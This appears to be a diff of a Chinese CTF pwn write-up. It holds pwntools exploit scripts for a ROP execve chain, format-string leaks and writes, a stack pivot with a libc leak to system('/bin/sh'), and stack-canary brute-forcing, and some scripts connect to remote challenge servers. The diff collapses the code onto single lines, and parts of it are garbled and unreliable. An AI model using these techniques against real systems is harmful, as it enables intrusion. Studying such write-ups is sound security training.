+'a'* 0x40 payload += p64(rax) + p64(0x0) + p64(rdi) + p64(0) + p64(rsi) + p64(bss) + p64(rdx_rbx) + p64(0x10) + p64(0x0) + p64(syscall) payload += p64(rax) + p64(0x3b) + p64(rdi) + p64(0x498ac9) + p64(rsi) + p64(0) + p64(rdx_rbx) + p64(0) + p64(0) + p64(syscall)
 ```
 
 附：[系统调用表](https://blog.csdn.net/SUKI547/article/details/103315487)
@@ -2908,43 +675,9 @@ by Maple
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-p
-
-=
-
-process
-(
-'./vuln'
-)
-
-payload
-
-=
-
-b
-'%8$s'
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
+from pwn import * p = process('./vuln') payload = b
+'%8$s'p.sendline(payload) p.interactive
 ()
-
 ```
 
 
@@ -2976,54 +709,9 @@ by Maple
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-p
-
-=
-
-process
-(
-'./vuln'
-)
-
-target
-
-=
-
-0x4040b0
-
-payload
-
-=
-
-b
-'aaa%7$hn'
-+
-p64
-(
-target
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
+from pwn import * p = process('./vuln') target = 0x4040b0 payload = b
+'aaa%7$hn'+ p64(target) p.sendline(payload) p.interactive
 ()
-
 ```
 
 
@@ -3064,375 +752,34 @@ by Maple
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-context
-(
-arch
-=
-'amd64'
-,
-os
-=
-'linux'
-,
-log_level
-=
-'debug'
-)
-
-#p = process("./pwn")
-
-p
-
-=
-
-remote
-(
-'gz.imxbt.cn'
-,
-20330
-)
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
-libc
-
-=
-
-ELF
-(
-"./libc.so.6"
-)
-
-p
-.
-recvuntil
-(
-b
-'mick0960.
-\n
-'
-)
-
-buf_addr
-
-=
-
-int
-(
-p
-.
-recv
-(
-14
+from pwn import * context(arch = 'amd64',
+os = 'linux',
+log_level = 'debug') #p = process("./pwn") p = remote('gz.imxbt.cn',
+20330) elf = ELF("./pwn") libc = ELF("./libc.so.6") p.recvuntil(b
+'mick0960.\n
+') buf_addr = int(p.recv(14
 ),
-16
-)
-
-log
-.
-info
-(
-"buf_addr:"
-+
-hex
-(
-buf_addr
-))
-
-seceret
-
-=
-
-0x4011dd
-
-main
-
-=
-
-0x40124a
-
-leave
-
-=
-
-0x00000000004012f2
-
-ret
-
-=
-
-0x000000000040101a
-
-#泄露libc基地址
-
-payload
-
-=
-
-p64
-(
-0
-)
-
-+
-
-p64
-(
-seceret
-)
-
-+
-
-p64
-(
-0
-)
-
-+
-
-p64
-(
-main
-)
-
-payload
-
-+=
-
-p64
-(
-0
-)
-
-+
-
-p64
-(
-0
-)
-
-#填充到rbp，0x30也就是48个字节减去前面的4*8,再填充两个
-
-payload
-
-+=
-
-p64
-(
-buf_addr
-)
-
-+
-
-p64
-(
-leave
-)
-#栈迁移，先覆盖返回地址为buf，再接leave_ret
-
-p
-.
-send
-(
-payload
-)
-
-p
-.
-recvuntil
-(
-b
-'0x'
-)
-
-libc_base
-
-=
-
-int
-(
-p
-.
-recv
-(
-12
+16) log.info("buf_addr:"+ hex(buf_addr
+)) seceret = 0x4011dd main = 0x40124a leave = 0x00000000004012f2 ret = 0x000000000040101a #泄露libc基地址 payload = p64(0) + p64(seceret) + p64(0) + p64(main) payload += p64(0) + p64(0) #填充到rbp，0x30也就是48个字节减去前面的4*8,再填充两个 payload += p64(buf_addr) + p64(leave)
+#栈迁移，先覆盖返回地址为buf，再接leave_ret p.send(payload) p.recvuntil(b
+'0x') libc_base = int(p.recv(12
 ),
-16
-)
--
-libc
-.
-sym
-[
-"puts"
-]
-
-log
-.
-info
-(
-"libc_base:"
-+
-hex
-(
-libc_base
+16) - libc.sym["puts"] log.info("libc_base:"+ hex(libc_base
 ))
-
-
-# 重新接受buf
-
-p
-.
-recvuntil
-(
-b
-'mick0960.
-\n
-'
-)
-
-buf_addr
-
-=
-
-int
-(
-p
-.
-recv
-(
-14
+# 重新接受buf p.recvuntil(b
+'mick0960.\n
+') buf_addr = int(p.recv(14
 ),
-16
-)
-
-log
-.
-info
-(
-"buf_addr:"
-+
-hex
-(
-buf_addr
-))
-
-system_addr
-
-=
-
-libc_base
-+
-libc
-.
-sym
-[
-"system"
-]
-
-binsh
-
-=
-
-libc_base
-+
-next
-(
-libc
-.
-search
-(
-b
+16) log.info("buf_addr:"+ hex(buf_addr
+)) system_addr = libc_base + libc.sym["system"] binsh = libc_base + next(libc.search(b
 '/bin/sh'
-))
-
-pop_rdi
-
-=
-
-libc_base
-+
-0x2a3e5
-
-payload
-
-=
-
-p64
-(
-0
-)
-+
-p64
-(
-ret
-)
-+
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-binsh
-)
-+
-p64
-(
-system_addr
-)
-
-payload
+)) pop_rdi = libc_base + 0x2a3e5 payload = p64(0) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system_addr) payload
 +=
-p64
-(
-0
-)
-
-
-# 填充一个
-
-payload
+p64(0)
+# 填充一个 payload
 +=
-p64
-(
-buf_addr
-)
-+
-p64
-(
-leave
-)
-
-p
-.
-send
-(
-payload
-)
-
-p
-.
-interactive
+p64(buf_addr) + p64(leave) p.send(payload) p.interactive
 ()
-
 ```
 
 
@@ -3450,364 +797,58 @@ by Maple
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-#context(os='linux', arch='amd64',log_level='debug')
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
-#p = process('./pwn')
-
-p
-
-=
-
-remote
-(
-'gz.imxbt.cn'
-,
-20467
-)
-
-libc
-
-=
-
-cdll
-.
-LoadLibrary
-(
-'/lib/x86_64-linux-gnu/libc.so.6'
-)
-
-seed
-
-=
-
-libc
-.
-time
-(
-0
-)
-
-libc
-.
-srand
-(
-seed
-)
-
-#-------爆破Canary-------
-
-canary
-
-=
-
-b
+from pwn import * from LibcSearcher import LibcSearcher from ctypes import * #context(os='linux', arch='amd64',log_level='debug') context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split
+() elf = ELF("./pwn") #p = process('./pwn') p = remote('gz.imxbt.cn',
+20467) libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6') seed = libc.time(0) libc.srand(seed) #-------爆破Canary------- canary = b
 '
 \x00
-'
-
-for
-
-i
-
-in
-
-range
-(
-7
+'for i in range(7
 ):
-
-
-for
-
-j
-
-in
-
-range
-(
-256
+for j in range(256
 ):
-
-
-num
-
-=
-
-libc
-.
-rand
-()
-%
-50
-
-
-p
-.
-sendline
-(
-str
-(
-num
+num = libc.rand
+() % 50
+p.sendline(str(num
 ))
-
-
-payload
-
-=
-
-b
-'a'
-*
-0x68
-+
-canary
-+
-p8
-(
-j
-)
-
-
-p
-.
-send
-(
-payload
-)
-
-
-p
-.
-recvuntil
-(
-'welcome
+payload = b
+'a'* 0x68 + canary + p8(j)
+p.send(payload)
+p.recvuntil('welcome
 \n
-'
-)
-
-
-rec
-
-=
-
-p
-.
-readline
+')
+rec = p.readline
 ()
-
-
-if
-
-b
-'smashing'
-
-not
-
-in
-
-rec
-:
-
-
-print
-(
-f
-'find
-{
-i
-+
-1
-}
-'
-)
-
-
-canary
-
-+=
-p8
-(
-j
-)
-
-
-break
-
-#log.info('Canary；'+hex(u64(canary)))
-
-shell
-
-=
-
-0x02B1
-
-while
-(
-1
+if b
+'smashing'not in rec:
+print(f
+'find{i + 1}
+')
+canary +=
+p8(j)
+break #log.info('Canary；'+hex(u64(canary))) shell = 0x02B1 while(1
 ):
-
-
-for
-
-i
-
-in
-
-range
-(
-16
+for i in range(16
 ):
-
-
-num
-
-=
-
-libc
-.
-rand
-()
-%
-50
-
-
-p
-.
-sendline
-(
-str
-(
-num
+num = libc.rand
+() % 50
+p.sendline(str(num
 ))
-
-
-payload
-
-=
-
-b
-'a'
-*
-0x68
-+
-canary
-+
-b
-'a'
-*
-0x8
-+
-p16
-(
-shell
-)
-
-
-p
-.
-send
-(
-payload
-)
-
-
-rec
-
-=
-
-p
-.
-readline
+payload = b
+'a'* 0x68 + canary + b
+'a'* 0x8 + p16(shell)
+p.send(payload)
+rec = p.readline
 ()
-
-
-log
-.
-info
-(
-rec
-)
-
-
-if
-
-b
-'welcome'
-
-in
-
-rec
-:
-
-
-p
-.
-readline
+log.info(rec)
+if b
+'welcome'in rec:
+p.readline
 ()
-
-
 shell
 +=
 0x1000
-
-
 continue
-
-
-else
-:
-
-
-break
-
-p
-.
-interactive
+else:
+break p.interactive
 ()
-
 ```
